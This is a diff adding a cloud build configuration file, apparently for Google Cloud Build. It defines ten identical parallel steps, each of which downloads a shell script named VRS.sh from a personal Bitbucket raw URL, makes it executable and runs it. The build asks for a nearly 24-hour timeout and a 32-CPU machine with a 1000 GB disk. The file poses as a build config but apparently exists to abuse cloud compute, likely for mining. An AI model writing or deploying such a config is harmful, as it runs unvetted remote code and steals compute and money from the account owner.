@@ -1,0 +1,85 @@
+steps:
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+    
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    
+    entrypoint: /bin/bash
+timeout: 86000s
+options:
+  machineType: E2_HIGHCPU_32
+  diskSizeGb: '1000'
